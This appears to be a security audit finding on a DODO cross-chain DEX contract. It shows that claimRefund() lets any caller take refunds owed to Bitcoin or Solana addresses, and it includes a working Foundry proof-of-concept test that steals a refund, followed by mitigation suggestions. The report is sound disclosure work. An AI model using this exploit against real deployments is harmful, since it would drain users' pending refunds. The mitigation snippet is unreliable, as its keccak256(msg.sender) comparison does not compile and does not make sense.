# Attacker will steal funds from users awaiting refunds.

### Summary

The missing receiver-verification in `GatewayTransferNative.sol`​ will cause a **complete loss of refund funds** for Bitcoin/Solana users as **an attacker will directly call** **​`claimRefund()`​** ​ **and receive the tokens**.



### Root Cause


In [GatewayTransferNative.sol](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L664) the function claimRefund() initialises
receiver = msg.sender and only overwrites it when refundInfo.walletAddress.length == 20.
Because non-EVM addresses (BTC, Solana) are not 20 bytes long, the overwrite never happens.

  ```solidity
  address receiver = msg.sender;                       // default = attacker
  if (refundInfo.walletAddress.length == 20) {         // skipped for BTC/Solana
      receiver = address(uint160(bytes20(refundInfo.walletAddress)));
  }
  require(bots[msg.sender] || msg.sender == receiver); // always true
  ```

  The `require`​ therefore succeeds for **any caller who is not black-listed**, allowing them to seize the refund.


### Internal Pre-conditions

1. A `RefundInfo`​ entry with `walletAddress.length != 20`​ (e.g. Bitcoin/Solana) exists in the `refundInfos`​ mapping.
2. The entry has not yet been deleted (i.e. the legitimate user has not claimed the refund).
3. ​`bots[attacker] == false`​ (default).


### External Pre-conditions

None – no oracle or market manipulation is needed.

### Attack Path

1. **Attacker** watches `EddyCrossChainRefund`​ events or directly scans storage for `refundInfos`​ whose `walletAddress.length != 20`​.
2. For each target `externalId`​, the attacker calls

    ```solidity
    GatewayTransferNative.claimRefund(externalId);
    ```
3. The `require`​ passes because `msg.sender == receiver`​ (both equal the attacker).
4. Contract transfers `refundInfo.amount`​ of `refundInfo.token`​ to the attacker and deletes the record.
5. Legitimate non-EVM user can no longer retrieve their funds.



### Impact

The user who was the legitimate recipient of the refund suffers a complete loss of their refunded assets. The attacker gains the full amount of the stolen refund at no cost.

### PoC

Add the following function to  test/GatewayTransferNativeTest.t.sol file.

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import {IZRC20} from "@zetachain/protocol-contracts/contracts/zevm/interfaces/IZRC20.sol";
import "@zetachain/protocol-contracts/contracts/zevm/interfaces/IGatewayZEVM.sol";
import {UniswapV2Library} from "../contracts/libraries/UniswapV2Library.sol";
import {BaseTest} from "./BaseTest.t.sol";
import {console} from "forge-std/console.sol";

/* forge test --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public */
contract GatewayTransferNativeTest is BaseTest {

    // ... (all the existing test functions) ...


    /**
     * @notice Test to demonstrate the refund vulnerability for non-EVM addresses.
     * @dev An attacker can steal funds when a refund is destined for an address
     * with a length other than 20 bytes (e.g., a Bitcoin address).
     */
    function test_Attack_StealNonEvmRefund() public {
        // --- 1. Setup ---
        // An attacker address, unrelated to the transaction.
        address attacker = makeAddr("attacker");

        // The refund amount.
        uint256 refundAmount = 1 ether;

        // The ZRC-20 token to be refunded (representing BTC on ZetaChain).
        address refundToken = address(btcZ);

        // A unique identifier for the failed transaction.
        bytes32 externalId = keccak256(abi.encodePacked("failed-btc-tx"));

        // The intended recipient's non-EVM (Bitcoin) address.
        // `btcAddress` is a `bytes` variable from BaseTest.t.sol.
        bytes memory intendedReceiverBtcAddress = btcAddress;

        // Simulate the contract holding the funds for the refund.
        // IZRC20(refundToken).mint(address(gatewayTransferNative), refundAmount);
        btcZ.mint(address(gatewayTransferNative), refundAmount);
        console.log("Initial attacker balance:", IZRC20(refundToken).balanceOf(attacker));
        assertEq(IZRC20(refundToken).balanceOf(attacker), 0);


        // --- 2. Create the pending refund ---
        // Simulate a revert callback from the gateway. This creates the RefundInfo.
        // The revert message contains the externalId and the non-20-byte Bitcoin address.
        vm.prank(address(gatewayZEVM));
        gatewayTransferNative.onRevert(
            RevertContext({
                sender: address(this),
                asset: refundToken,
                amount: refundAmount,
                revertMessage: bytes.concat(externalId, intendedReceiverBtcAddress)
            })
        );

        // Verify that the refund info has been stored.
        (bytes32 id, address token, uint256 amount, bytes memory wallet) = gatewayTransferNative.refundInfos(externalId);
        assertEq(id, externalId);
        assertEq(wallet.length, intendedReceiverBtcAddress.length); // Should not be 20
        console.log("Refund pending for non-EVM address:", vm.toString(wallet));


        // --- 3. Attacker steals the refund ---
        console.log("Attacker attempts to claim the refund...");
        vm.startPrank(attacker);
        gatewayTransferNative.claimRefund(externalId);
        vm.stopPrank();
        console.log("Claim successful.");


        // --- 4. Verification ---
        // Check that the attacker's balance has increased by the refund amount.
        uint256 attackerFinalBalance = IZRC20(refundToken).balanceOf(attacker);
        console.log("Final attacker balance: ", attackerFinalBalance);
        assertEq(attackerFinalBalance, refundAmount, "Attacker should have stolen the funds");

        // Check that the refund info has been deleted after the claim.
        (id, , , ) = gatewayTransferNative.refundInfos(externalId);
        assertEq(id, 0, "RefundInfo should be deleted after claim");

        // Check that the contract's balance is now zero.
        assertEq(IZRC20(refundToken).balanceOf(address(gatewayTransferNative)), 0);
    }

    // ... (rest of the existing test functions) ...
}
```


### Mitigation

1. **Store and verify the intended recipient explicitly**

    ```solidity
    struct RefundInfo { … address evmReceiver; bytes nonEvmReceiver; }
    require(
        bots[msg.sender] ||
        msg.sender == refundInfo.evmReceiver ||
        keccak256(msg.sender) == keccak256(refundInfo.nonEvmReceiver),
        "INVALID_CALLER"
    );
    ```
2. **Or enforce a single 20-byte receiver field** and keep non-EVM addresses in a separate mapping or process them via an off-chain relay.
3. Add a **cool-down or guardian role** so refunds can only be claimed by a whitelisted relayer after additional verification.
